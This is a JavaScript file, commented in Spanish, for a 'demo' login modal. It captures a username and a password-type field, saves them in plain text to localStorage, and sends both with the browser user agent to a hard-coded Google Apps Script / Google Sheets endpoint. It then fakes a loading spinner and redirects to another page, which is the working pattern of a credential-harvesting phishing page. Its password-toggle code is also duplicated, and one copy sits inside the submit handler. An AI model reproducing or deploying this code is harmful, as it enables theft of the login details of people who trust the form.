// ===============================
// CONFIGURACIÓN
// ===============================
// Pega aquí la URL /exec de tu Web App (Apps Script)
const SHEETS_ENDPOINT =
  "https://script.google.com/macros/s/AKfycbzqmJ8usq5bz2C8cQzln4FxDqZkRl5XRXFzdLUcR8qd4YGWLdzVxCXej02wgzE0R9di/exec";

// ===============================
// ELEMENTOS
// ===============================
const loginModal = document.getElementById("loginModal");
const openLoginBtn = document.getElementById("openLoginBtn");
const goLoginIcon = document.getElementById("goLogin");
const demoLoginForm = document.getElementById("demoLoginForm");

// ===============================
// ABRIR MODAL
// ===============================
function openLoginModal() {
  if (loginModal && typeof loginModal.showModal === "function") {
    loginModal.showModal();
  } else {
    // Fallback si <dialog> no funciona
    window.location.href = "form.html";
  }
}

if (openLoginBtn) openLoginBtn.addEventListener("click", openLoginModal);
if (goLoginIcon) goLoginIcon.addEventListener("click", openLoginModal);

// ===============================
// SUBMIT: GUARDAR + ENVIAR + REDIRIGIR
// ===============================
if (demoLoginForm) {
  demoLoginForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const demoUserEl = document.getElementById("demoUser");
    const demoNickEl = document.getElementById("demoNick");
    const button = document.getElementById("loginSubmit");

    const demoUser = (demoUserEl?.value || "").trim();
    const demoNick = (demoNickEl?.value || "").trim();

    if (!demoUser || !demoNick) return;

    // Activar animación
    if (button) {
      button.classList.add("loading");
      button.disabled = true;
    }
    const toggleNick = document.getElementById("toggleNick");
    const demoNickInput = document.getElementById("demoNick");
    const eyeIcon = document.getElementById("eyeIcon");
    
    toggleNick?.addEventListener("click", () => {
      const isPassword = demoNickInput.type === "password";
      demoNickInput.type = isPassword ? "text" : "password";
    
      // Cambiar icono
      eyeIcon.innerHTML = isPassword
        ? '<path d="M3 3l18 18M12 5c-7 0-10 7-10 7a19 19 0 0 0 5 5m5 2c7 0 10-7 10-7a19 19 0 0 0-5-5"/>' // ojo cerrado
        : '<path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7Zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8Z"/>'; // ojo abierto
    });

    // Guardar sesión local (demo)
    const session = { demoUser, demoNick, ts: new Date().toISOString() };
    localStorage.setItem("icss_demo_session", JSON.stringify(session));

    // Enviar a Google Sheets
    // (usamos URLSearchParams para evitar preflight CORS)
    try {
      const body = new URLSearchParams({
        demoUser,
        demoNick,
        userAgent: navigator.userAgent
      });

      // Importante: Apps Script puede responder sin CORS, pero igual suele registrar
      await fetch(SHEETS_ENDPOINT, {
        method: "POST",
        body
      });
    } catch (err) {
      console.warn("No se pudo enviar a Google Sheets:", err);
    }

    // Simular carga antes de redirigir (para que se vea el spinner)
    setTimeout(() => {
      if (loginModal && typeof loginModal.close === "function") loginModal.close();
      window.location.href = "form.html";
    }, 900);
  });
}
const toggleNick = document.getElementById("toggleNick");
const demoNickInput = document.getElementById("demoNick");
const eyeOpen = document.getElementById("eyeOpen");
const eyeClosed = document.getElementById("eyeClosed");

toggleNick?.addEventListener("click", () => {
  const isPassword = demoNickInput.type === "password";

  demoNickInput.type = isPassword ? "text" : "password";

  if (eyeOpen && eyeClosed) {
    eyeOpen.style.display = isPassword ? "none" : "block";
    eyeClosed.style.display = isPassword ? "block" : "none";
  }
});
